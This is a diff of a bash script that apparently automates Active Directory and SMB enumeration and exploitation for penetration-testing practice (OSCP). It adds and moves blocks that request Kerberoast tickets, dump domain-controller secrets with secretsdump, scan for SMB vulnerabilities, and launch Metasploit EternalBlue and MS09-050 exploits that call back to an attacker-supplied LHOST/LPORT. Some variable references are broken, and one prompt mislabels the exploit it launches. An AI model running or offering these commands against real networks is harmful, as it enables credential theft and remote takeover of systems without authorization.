@@ -46,14 +46,16 @@ elif [ $answer = i ] ; then
 	echo -e '\E[31;40m' "Downloading impacket in home directory"
 	sudo apt update
 	cd 
-	pip3 uninstall impacket
+	sudo pip3 uninstall impacket
 	git clone https://github.com/cube0x0/impacket
 	cd impacket
-	python3 ./setup.py install
+	sudo python3 ./setup.py install
+	sudo apt update
 elif [ $answer = c ] ; then
 	echo -e '\E[31;40m' "Downloading crackmapexec"
 	sudo apt update
 	sudo apt install crackmapexec
+	sudo apt update 
 elif [ $answer = a ] ; then
 	echo -e '\E[31;40m' "Downloading all 3"
 	sudo apt install -y feroxbuster
@@ -169,6 +171,56 @@ then
 	fi
 else 
 		echo "Continuing Script"
+fi
+
+if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
+then
+	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
+	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
+	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
+		echo -e '\E[31;35m' "Looking up SID"; tput sgr0
+	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
+		echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
+	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
+	else
+	echo ""
+fi
+
+if grep 445/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "Checking if SMB is vulnerable to anything"; tput sgr0
+	nmap -p 445 --script=smb-vuln-* -Pn $DOMAINIP >> $DOMAINIP.txt
+	echo -e '\E[31;35m' "Seeing if anonymous login works with no password, hit enter on the next part"; tput sgr0
+	smbclient -L \\\\$DOMAINIP\\ 
+	echo -e '\E[31;35m' "Running enum4linux just to make sure, make take a minute"; tput sgr0
+	enum4linux $DOMAINIP >> $DOMAINIP.txt
+	enum4linux -u $USER -p PASS -a $DOMAINIP >> $DOMAINIP.txt
+fi
+
+if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
+then
+	echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue"
+	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
+	if [ $answer = y ] ; then
+		echo "LHOST?"
+		read LHOST
+		echo "LPORT?"
+		read LPORT
+		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+	fi
+fi
+
+if grep "CVE:CVE-2009-3103" $DOMAINIP.txt
+then
+	echo -e '\E[31;40m'"Most likely vulnerable to MS09-050"
+	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
+	if [ $answer = y ] ; then
+		echo "LHOST?"
+		read LHOST
+		echo "LPORT?"
+		read LPORT
+		msfconsole -x "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+	fi
 fi
 
 if grep 88/tcp $DOMAINIP.txt
@@ -326,48 +378,11 @@ then
 	fi
 fi
 
-if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
-then
-	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
-	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
-	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
-		echo -e '\E[31;35m' "Looking up SID"; tput sgr0
-	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
-		echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
-	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
-	else
-	echo ""
-fi
-
 if grep 111/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "RPC is open, checking to see if anonymous login is allowed"; tput sgr0
 	rpcclient -U "" -N DOMAINIP >> $DOMAINIP.txt
 	rpcinfo -p $DOMAINIP >> $DOMAINIP.txt
-fi
-
-if grep 445/tcp $DOMAINIP.txt
-then
-	echo -e '\E[31;35m' "Checking if SMB is vulnerable to anything"; tput sgr0
-	nmap -p 445 --script=smb-vuln-* -Pn $DOMAINIP >> $DOMAINIP.txt
-	echo -e '\E[31;35m' "Seeing if anonymous login works with no password, hit enter on the next part"; tput sgr0
-	smbclient -L \\\\$DOMAINIP\\ 
-	echo -e '\E[31;35m' "Running enum4linux just to make sure, make take a minute"; tput sgr0
-	enum4linux $DOMAINIP >> $DOMAINIP.txt
-	enum4linux -u $USER -p PASS -a $DOMAINIP >> $DOMAINIP.txt
-fi
-
-if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
-then
-	echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue"
-	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
-	if [ $answer = y ] ; then
-		echo "LHOST?"
-		read LHOST
-		echo "LPORT?"
-		read LPORT
-		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
-	fi
 fi
 
 if grep 1521/tcp $DOMAINIP.txt
